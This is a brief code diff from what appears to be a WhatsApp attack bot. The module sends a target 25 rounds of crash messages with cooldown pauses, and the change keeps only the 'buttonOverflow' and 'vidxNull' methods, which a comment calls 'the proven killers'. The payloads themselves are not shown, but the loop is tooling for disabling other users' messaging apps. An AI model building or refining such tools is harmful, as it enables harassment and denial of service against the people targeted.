@@ -37,7 +37,8 @@ module.exports = {
             
             const TOTAL = 25;
             const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
-            const methods = ['iosInvisibleForce', 'samsung', 'buttonOverflow', 'vidxNull'];
+            // ── ONLY buttonOverflow + vidxNull (the proven killers) ────
+            const methods = ['buttonOverflow', 'vidxNull', 'buttonOverflow', 'vidxNull'];
             
             for (let i = 0; i < TOTAL; i++) {
                 let allowed = false;
@@ -50,7 +51,7 @@ module.exports = {
                         const chunks = Math.ceil(waitSec / 5);
                         for (let c = 0; c < chunks; c++) {
                             await new Promise(r => setTimeout(r, 5000));
-                            await bar.setPhase(`⏳ ᴄᴏᴏʟᴅᴏᴡɴ: ${Math.max(0, waitSec - (c + 1) * 5)}s`);
+                            await bar.setPhase(`⏳ ᴄᴏᴏʟᴅᴏᴡɴ: ${Math.max(0, waitSec - (c + 1) * 5)}s ʀᴇᴍᴀɪɴɪɴɢ`);
                         }
                     }
                 }
